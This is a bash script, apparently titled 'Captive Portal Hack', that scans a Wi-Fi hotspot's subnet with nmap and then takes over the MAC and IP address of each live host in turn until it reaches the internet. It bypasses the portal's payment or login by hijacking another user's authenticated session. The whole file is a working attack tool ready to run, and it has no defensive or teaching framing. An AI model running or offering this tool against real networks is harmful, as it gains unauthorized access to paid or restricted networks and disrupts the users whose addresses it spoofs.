#!/bin/bash
#==============================================================================
#title           :Captive Portal Hack
#author          :CMX
#date            :30/07/2020
#==============================================================================

logo() {
	echo "$(tput setaf 1)
	_________                __  .__               __________              __         .__      ___ ___                __    
	\_   ___ \_____  _______/  |_|__|__  __ ____   \______   \____________/  |______  |  |    /   |   \_____    ____ |  | __
	/    \  \/\__  \ \____ \   __\  \  \/ // __ \   |     ___/  _ \_  __ \   __\__  \ |  |   /    ~    \__  \ _/ ___\|  |/ /
	\     \____/ __ \|  |_> >  | |  |\   /\  ___/   |    |  (  <_> )  | \/|  |  / __ \|  |__ \    Y    // __ \\  \___|    < 
	 \______  (____  /   __/|__| |__| \_/  \___  >  |____|   \____/|__|   |__| (____  /____/  \___|_  /(____  /\___  >__|_ \  \n"

	 echo "$(tput setaf 1) \n                             A Captive Portal Hack by CMX. \n\n"
 }

init_wifi() {
	interface="$(ip -o -4 route show to default | awk '/dev/ {print $5}')"
	localip="$(ip -o -4 route get 1 | awk '/src/ {print $7}')"
	wifissid="$(iw dev "$interface" link | awk '/SSID/ {print $NF}')"
	gateway="$(ip -o -4 route show to default | awk '/via/ {print $3}')"
	broadcast="$(ip -o -4 addr show dev "$interface" | awk '/brd/ {print $6}')"
	ipmask="$(ip -o -4 addr show dev "$interface" | awk '/inet/ {print $4}')"
	netmask="$(printf "%s\n" "$ipmask" | cut -d "/" -f 2)"
	netaddress="$(sipcalc "$ipmask" | awk '/Network address/ {print $NF}')"
	network="$netaddress/$netmask"
	macaddress="$(ip -0 addr show dev "$interface" \
	              | awk '/link/ && /ether/ {print $2}' \
	              | tr '[:upper:]' '[:lower:]')"
}

check_sudo() {
  if [[ "$EUID" -ne 0 ]]; then
    printf "%b\n" "ERROR This script must be run as root. Use sudo." >&2
    exit 1
  fi
}

create_tmp() {
  unset tmp
  tmp="$(mktemp -q -d "${TMPDIR:-/tmp}/hackaptive_XXXXXXXXXX")" || {
    printf "%b\n" "ERROR Unable to create temporary folder. Abort." >&2
    exit 1
  }
}

clean_up() {
  rm -rf "$tmp"
  trap 0
  exit
}

calc_network() {
  printf "%b\n" "Exploring network in \"$wifissid\" Wi-Fi hotspot."
  if [[ "$netmask" -lt 24 ]]; then
    sipcalc -s 24 "$network" \
    | awk '/Network/ {print $3}' > "$tmp"/networklist.$$.txt
    printf "%b\n" "Splitting up network $network into smaller chunks."
  else
    printf "%s\n" "$network" | cut -d "/" -f 1 > "$tmp"/networklist.$$.txt
  fi
}

main() {
  while read -r networkfromlist; do
    if [[ "$netmask" -lt 24 ]]; then
      network="$networkfromlist/24"
    else
      network="$networkfromlist/$netmask"
    fi

  # Scan selected network for active hosts.
  printf "%b\n" "Looking for active hosts in $network. Please wait."
  nmap -n -sn -PR -PS -PA -PU -T5 --exclude "$localip","$gateway" "$network" \
  | awk '/for/ {print $5} ; /Address/ {print $3}' \
  | sed '$!N;s/\n/ - /' > "$tmp"/hostsalive.$$.txt

  # Set founded IP and MAC for wireless interface.
    while read -r hostline; do
      newipset="$(printf "%s\n" "$hostline" | awk '{print $1}')"
      newmacset="$(printf "%s\n" "$hostline" \
                   | awk '{print $3}' \
                   | tr '[:upper:]' '[:lower:]')"
      printf "%b\n" "Trying to hijack $newipset - $newmacset"
      ip link set "$interface" down
      ip link set dev "$interface" address "$newmacset"
      ip link set "$interface" up
      ip addr flush dev "$interface"
      ip addr add "$newipset/$netmask" broadcast "$broadcast" dev "$interface"
      ip route add default via "$gateway"
      sleep 1

      ping -c1 -w1 8.8.8.8 >/dev/null
      if [[ $? -eq 0 ]]; then
        printf "%b\n" "Pwned! Now you can surf the Internet!"
        exit 0
      fi
    done < "$tmp"/hostsalive.$$.txt
    rm -rf "$tmp"/hostsalive.$$.txt
    printf "%b\n" "Suitable hosts not found. Checking another network chunk."

  done < "$tmp"/networklist.$$.txt
  rm -rf "$tmp"/networklist.$$.txt
  printf "%b\n" "No luck! Try again later or try another Wi-Fi hotspot."

  ip link set "$interface" down
  ip link set dev "$interface" address "$macaddress"
  ip link set "$interface" up
  ip addr flush dev "$interface"
  ip addr add "$ipmask" broadcast "$broadcast" dev "$interface"
  ip route add default via "$gateway"
}

logo
init_wifi
trap clean_up 0 1 2 3 15
check_sudo
create_tmp
calc_network
main
